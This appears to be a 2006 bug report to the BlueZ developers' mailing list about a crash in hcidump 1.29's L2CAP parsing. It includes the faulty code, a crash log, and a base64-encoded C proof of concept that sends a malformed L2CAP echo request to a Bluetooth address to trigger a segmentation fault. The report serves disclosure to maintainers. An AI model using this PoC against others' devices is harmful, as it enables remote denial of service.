Return-Path: <bluez-devel-admin@lists.sourceforge.net>
From: Pierre BETOUIN <info16@unsigned.ath.cx>
To: bluez-devel@lists.sourceforge.net
Content-Type: multipart/signed; micalg=pgp-sha1; protocol="application/pgp-signature"; boundary="=-VG2vuEvT3KJ7MlFslQuI"
Message-Id: <1137606424.3070.18.camel@lapt41p>
Mime-Version: 1.0
Subject: [Bluez-devel] Bug in l2cap.c
Sender: bluez-devel-admin@lists.sourceforge.net
Errors-To: bluez-devel-admin@lists.sourceforge.net
Reply-To: bluez-devel@lists.sourceforge.net
List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/bluez-devel>,
	<mailto:bluez-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Id: BlueZ development <bluez-devel.lists.sourceforge.net>
List-Post: <mailto:bluez-devel@lists.sourceforge.net>
List-Help: <mailto:bluez-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/bluez-devel>,
	<mailto:bluez-devel-request@lists.sourceforge.net?subject=subscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=bluez-devel>
Date: Wed, 18 Jan 2006 18:47:04 +0100


--=-VG2vuEvT3KJ7MlFslQuI
Content-Type: multipart/mixed; boundary="=-4tZNbcySr2KPYaB0gVyz"


--=-4tZNbcySr2KPYaB0gVyz
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable

	Hi list,

Currently pentesting several bluetooth devices, I found a bug in hcidump
(tested version : 1.29).=20

The affected code, located in l2cap.c, is :
------------------------------------------------------------------
while (frm->len >=3D L2CAP_CMD_HDR_SIZE) {
	if (!p_filter(FILT_L2CAP)) {
		p_indent(level, frm);
		printf("L2CAP(s): ");
	}
       =20
	switch (hdr->code) {
	l2cap_cmd_hdr *hdr =3D frm->ptr;
	frm->ptr +=3D L2CAP_CMD_HDR_SIZE;
	frm->len -=3D L2CAP_CMD_HDR_SIZE;
	(...)
	default:
		if (p_filter(FILT_L2CAP))
			break;
		printf("code 0x%2.2x ident %d len %d\n",
			hdr->code, hdr->ident, btohs(hdr->len));
			raw_dump(level, frm);
	}
	frm->ptr +=3D btohs(hdr->len);
	frm->len -=3D btohs(hdr->len);
------------------------------------------------------------------

# ./hcidump-crash 00:80:09:XX:XX:XX
L2CAP packet sent (15)
Buffer: 08 01 0B 00 41 41 41 41 41 41 41 41 41 41 41

# hcidump
HCI sniffer - Bluetooth packet analyzer ver 1.29
device: hci0 snap_len: 1028 filter: 0xffffffff
< HCI Command: Create Connection (0x01|0x0005) plen 13
> HCI Event: Command Status (0x0f) plen 4
> HCI Event: Connect Complete (0x03) plen 11
< HCI Command: Write Link Policy Settings (0x02|0x000d) plen 4
< ACL data: handle 41 flags 0x02 dlen 19
    L2CAP(s): debug : code=3D8
Echo req: dlen 12
    L2CAP(s): debug : code=3D0
code 0x00 ident 0 len 0
(...)
    L2CAP(s): debug : code=3D0
code 0x00 ident 0 len 0
segmentation fault

The PoC source file is joined.

	Pierre

--=20
Pierre BETOUIN
info16@unsigned.ath.cx
http://securitech.homeunix.org
GPG Key : 0x94D9CB23

--=-4tZNbcySr2KPYaB0gVyz
Content-Disposition: attachment; filename=hcidump-crash.c
Content-Type: text/x-csrc; name=hcidump-crash.c; charset=us-ascii
Content-Transfer-Encoding: base64

LyoJaGNpZHVtcCB2LiAxLjI5IGJsdWV6CQkJCSovDQovKiAJUGllcnJlIEJFVE9VSU4gPHBpZXJy
ZS5iZXRvdWluQHNlY3VyaXR5LWxhYnMub3JnPgkqLw0KLyoJMDEvMTgvMDYJCQkJCQkqLw0KLyoJ
Q3Jhc2hlcyBoY2lkdW1wIHNlbmRpbmcgYmFkIEwyQ0FQIHBhY2tldAkJKi8NCi8qCQkJCQkJCQkq
Lw0KLyoJZ2NjIC1sYmx1ZXRvb3RoIGhjaWR1bXAtY3Jhc2guYyAtbyBoY2lkdW1wLWNyYXNoCSov
DQovKgkuL2J1ZyAwMDo4MDozNzpYWDpYWDpYWAkJCQkJKi8NCi8qCUwyQ0FQIHBhY2tldCBzZW50
ICgxNSkJCQkJCSovDQovKglCdWZmZXI6IDA4IDAxIDBDIDAwIDQxIDQxIDQxIDQxIDQxIDQxIDQx
IDQxIDQxIDQxIDQxCSovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5o
Pg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUg
PHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxibHVldG9vdGgvYmx1ZXRvb3RoLmg+DQojaW5jbHVk
ZSA8Ymx1ZXRvb3RoL2hjaS5oPg0KI2luY2x1ZGUgPGJsdWV0b290aC9sMmNhcC5oPg0KDQojZGVm
aW5lIFNJWkUJCTE1DQojZGVmaW5lIEZBS0VfU0laRQkxMg0KDQppbnQgbWFpbihpbnQgYXJnYywg
Y2hhciAqKmFyZ3YpDQp7DQoJY2hhciAqYnVmZmVyOw0KCWwyY2FwX2NtZF9oZHIgKmNtZDsJDQoJ
c3RydWN0IHNvY2thZGRyX2wyIGFkZHI7DQoJaW50IHNvY2ssIHNlbnQsIGk7DQoNCglpZihhcmdj
IDwgMikNCgl7DQoJCWZwcmludGYoc3RkZXJyLCAiJXMgPGJ0YWRkcj5cbiIsIGFyZ3ZbMF0pOw0K
CQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCQ0KCWlmICgoc29jayA9IHNvY2tldChQRl9CTFVF
VE9PVEgsIFNPQ0tfUkFXLCBCVFBST1RPX0wyQ0FQKSkgPCAwKSANCgl7DQoJCXBlcnJvcigic29j
a2V0Iik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCgltZW1zZXQoJmFkZHIsIDAsIHNp
emVvZihhZGRyKSk7DQoJYWRkci5sMl9mYW1pbHkgPSBBRl9CTFVFVE9PVEg7DQoNCglpZiAoYmlu
ZChzb2NrLCAoc3RydWN0IHNvY2thZGRyICopICZhZGRyLCBzaXplb2YoYWRkcikpIDwgMCkgDQoJ
ew0KCQlwZXJyb3IoImJpbmQiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXN0cjJi
YShhcmd2WzFdLCAmYWRkci5sMl9iZGFkZHIpOw0KCQ0KCWlmIChjb25uZWN0KHNvY2ssIChzdHJ1
Y3Qgc29ja2FkZHIgKikgJmFkZHIsIHNpemVvZihhZGRyKSkgPCAwKSANCgl7DQoJCXBlcnJvcigi
Y29ubmVjdCIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCQ0KCWlmKCEoYnVmZmVyID0g
KGNoYXIgKikgbWFsbG9jICgoaW50KSBTSVpFICsgMSkpKSANCgl7DQoJCXBlcnJvcigibWFsbG9j
Iik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoJDQoJbWVtc2V0KGJ1ZmZlciwgJ0EnLCBT
SVpFKTsNCg0KCWNtZCA9IChsMmNhcF9jbWRfaGRyICopIGJ1ZmZlcjsNCgljbWQtPmNvZGUgPSBM
MkNBUF9FQ0hPX1JFUTsNCgljbWQtPmlkZW50ID0gMTsNCgljbWQtPmxlbiA9IEZBS0VfU0laRTsN
CgkNCglpZiggKHNlbnQ9c2VuZChzb2NrLCBidWZmZXIsIFNJWkUsIDApKSA+PSAwKQ0KCXsNCgkJ
cHJpbnRmKCJMMkNBUCBwYWNrZXQgc2VudCAoJWQpXG4iLCBzZW50KTsNCgl9DQoNCglwcmludGYo
IkJ1ZmZlcjpcdCIpOw0KCWZvcihpPTA7IGk8c2VudDsgaSsrKQ0KCQlwcmludGYoIiUuMlggIiwg
KHVuc2lnbmVkIGNoYXIpIGJ1ZmZlcltpXSk7DQoJcHJpbnRmKCJcbiIpOw0KDQoJZnJlZShidWZm
ZXIpOw0KCWNsb3NlKHNvY2spOw0KCXJldHVybiBFWElUX1NVQ0NFU1M7DQp9DQo=


--=-4tZNbcySr2KPYaB0gVyz--

--=-VG2vuEvT3KJ7MlFslQuI
Content-Type: application/pgp-signature; name=signature.asc
Content-Description: Ceci est une partie de message
	=?ISO-8859-1?Q?num=E9riquement?= =?ISO-8859-1?Q?_sign=E9e?=

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (GNU/Linux)

iD8DBQBDzn8YLNWSQpTZyyMRAuIuAJ4z7Loh94SmyF3jGYAG/hN271So8QCcDQ2X
t8jLXHlcIK9RRWzXlZSkBs4=
=Tzqj
-----END PGP SIGNATURE-----

--=-VG2vuEvT3KJ7MlFslQuI--



-------------------------------------------------------
This SF.net email is sponsored by: Splunk Inc. Do you grep through log files
for problems?  Stop!  Download the new AJAX search engine that makes
searching your log files as easy as surfing the  web.  DOWNLOAD SPLUNK!
http://sel.as-us.falkag.net/sel?cmd=lnk&kid=103432&bid=230486&dat=121642
_______________________________________________
Bluez-devel mailing list
Bluez-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/bluez-devel
